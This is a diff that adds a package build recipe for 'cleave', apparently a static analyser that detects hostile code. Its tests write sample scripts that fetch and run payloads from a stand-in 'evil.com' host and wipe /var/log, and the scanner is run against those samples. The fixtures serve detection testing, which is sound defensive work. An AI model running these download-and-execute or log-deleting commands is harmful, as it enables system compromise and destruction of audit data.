@@ -1,0 +1,120 @@
+#nolint:valid-pipeline-git-checkout-tag
+package:
+  name: cleave
+  version: "1.4.0"
+  epoch: 0
+  description: "Atomic-level static analysis across binaries and source."
+  copyright:
+    - license: Apache-2.0
+  resources:
+    cpu: "4"
+    memory: 8Gi
+
+vars:
+  rust-version: "1.95"
+
+environment:
+  contents:
+    packages:
+      - build-base
+      - busybox
+      - ca-certificates-bundle
+      - cargo-auditable
+      - git
+      - rust-${{vars.rust-version}}
+
+pipeline:
+  - uses: git-checkout
+    with:
+      repository: https://codeberg.org/atomdrift/cleave
+      tag: v${{package.version}}
+      expected-commit: c36812c913c0879b712a6c525ecf4b18663469e8
+
+  - uses: git-checkout
+    with:
+      repository: https://codeberg.org/atomdrift/cleave-traits
+      branch: main
+      expected-commit: 081286cbbfbeb51ae756579d6780d4a564bac22d
+      destination: cleave-traits
+
+  - name: Bump lru to 0.16.3 to remediate GHSA-rhfx-m35p-ff5j
+    runs: |
+      sed -i 's/lru = "0\.12"/lru = "0.16.3"/' Cargo.toml
+      cargo update -p lru --precise 0.16.3
+
+  - uses: cargo/build
+    with:
+      output: cleave
+
+  - runs: |
+      mkdir -p ${{targets.destdir}}/usr/share/cleave/traits
+      cp -r cleave-traits/* ${{targets.destdir}}/usr/share/cleave/traits/
+
+  - uses: strip
+
+update:
+  enabled: true
+  git:
+    strip-prefix: v
+    tag-filter-prefix: v
+
+test:
+  environment:
+    environment:
+      CLEAVE_TRAITS_DIR: /usr/share/cleave/traits
+  pipeline:
+    - uses: test/tw/ldd-check
+    - uses: test/tw/help-check
+      with:
+        bins: cleave
+    - name: "Analyze a shell script"
+      runs: |
+        tee /tmp/test_script.sh <<'SCRIPT'
+        #!/bin/sh
+        curl http://example.com/payload | sh
+        wget http://evil.com/malware -O /tmp/dropped
+        chmod +x /tmp/dropped
+        /tmp/dropped
+        SCRIPT
+        cleave /tmp/test_script.sh || true
+    - name: "JSONL output format"
+      runs: |
+        tee /tmp/jsonl_test.sh <<'SCRIPT'
+        #!/bin/sh
+        wget http://evil.com/backdoor -O /tmp/bd
+        chmod +x /tmp/bd
+        /tmp/bd
+        SCRIPT
+        cleave --format jsonl /tmp/jsonl_test.sh > /tmp/cleave_jsonl.txt || true
+        grep -F "{" /tmp/cleave_jsonl.txt
+    - name: "Scan a directory recursively"
+      runs: |
+        mkdir -p /tmp/scan_dir
+        tee /tmp/scan_dir/download.sh <<'SCRIPT'
+        #!/bin/sh
+        curl -o /tmp/payload http://evil.com/bin
+        SCRIPT
+        tee /tmp/scan_dir/cleanup.py <<'SCRIPT'
+        import os, shutil
+        shutil.rmtree("/var/log")
+        SCRIPT
+        cleave /tmp/scan_dir || true
+    - name: "Severity filtering with --min-crit"
+      runs: |
+        tee /tmp/filter_test.sh <<'SCRIPT'
+        #!/bin/sh
+        curl http://evil.com/payload | sh
+        wget http://evil.com/malware -O /tmp/dropped
+        chmod +x /tmp/dropped
+        /tmp/dropped
+        rm -rf /var/log
+        SCRIPT
+        cleave --format jsonl --min-crit hostile /tmp/filter_test.sh > /tmp/hostile.txt || true
+        cleave --format jsonl /tmp/filter_test.sh > /tmp/total.txt || true
+        hostile_count=$(wc -l < /tmp/hostile.txt)
+        total_count=$(wc -l < /tmp/total.txt)
+        echo "hostile=$hostile_count total=$total_count"
+        if [ "$hostile_count" -gt "$total_count" ]; then
+          echo "ERROR: hostile-filtered count exceeds unfiltered count"
+          exit 1
+        fi
